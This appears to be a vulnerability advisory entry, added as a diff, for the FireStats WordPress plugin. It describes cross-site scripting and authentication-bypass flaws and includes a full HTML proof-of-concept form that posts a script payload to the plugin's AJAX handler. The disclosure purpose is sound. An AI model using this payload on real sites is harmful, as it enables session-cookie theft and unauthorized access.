@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/37099/info
+
+The FireStats plugin for WordPress is prone to multiple cross-site scripting vulnerabilities and an authentication-bypass vulnerability.
+
+An attacker may leverage these issues to gain unauthorized access to the affected application and execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+FireStats 1.0.2 is vulnerable; other versions may also be affected. 
+
+<html> <head> <title>FireStats XSS exploit (C) 2008 MustLive. http://websecurity.com.ua</title> </head> <!-- <body onLoad="document.hack.submit()"> --> <body> <form name="hack" action="http://www.example.com/wp-content/plugins/firestats/php/ajax-handler.php?FS_FULL_INSTALLATION=1&FS_IN_WORDPRESS=0" method="post"> <input type="hidden" name="action" value="<BODY onload=alert(document.cookie)>" /> </body> </html> 
